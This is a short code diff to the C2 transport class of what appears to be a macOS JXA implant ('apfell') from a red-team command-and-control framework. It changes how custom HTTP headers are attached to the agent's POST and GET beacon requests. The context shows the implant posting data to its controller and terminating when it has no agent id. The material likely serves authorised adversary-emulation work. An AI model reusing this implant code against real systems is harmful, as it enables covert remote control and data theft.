@@ -297,8 +297,8 @@ class customC2 extends baseC2{
 				let postData = data.dataUsingEncodingAllowLossyConversion($.NSASCIIStringEncoding, true);
 				let postLength = $.NSString.stringWithFormat("%d", postData.length);
 				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
-				for(let i = 0; i < this.header_list.length; i++){
-					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.header_list[i]["value"]), $.NSString.alloc.initWithUTF8String(this.header_list[i]["key"]));
+				for(let key in this.header_list){
+					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.header_list[key]), $.NSString.alloc.initWithUTF8String(key));
 				}
 				req.setHTTPBody(postData);
 				let response = Ref();
@@ -370,8 +370,8 @@ class customC2 extends baseC2{
 				if(apfell.id === undefined || apfell.id === ""){ $.NSApplication.sharedApplication.terminate(this);}
 				let req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
 				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
-				for(let i = 0; i < this.header_list.length; i++){
-					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.header_list[i]["value"]), $.NSString.alloc.initWithUTF8String(this.header_list[i]["key"]));
+				for(let key in this.header_list){
+					req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.header_list[key]), $.NSString.alloc.initWithUTF8String(key));
 				}
 				let response = Ref();
 				let error = Ref();
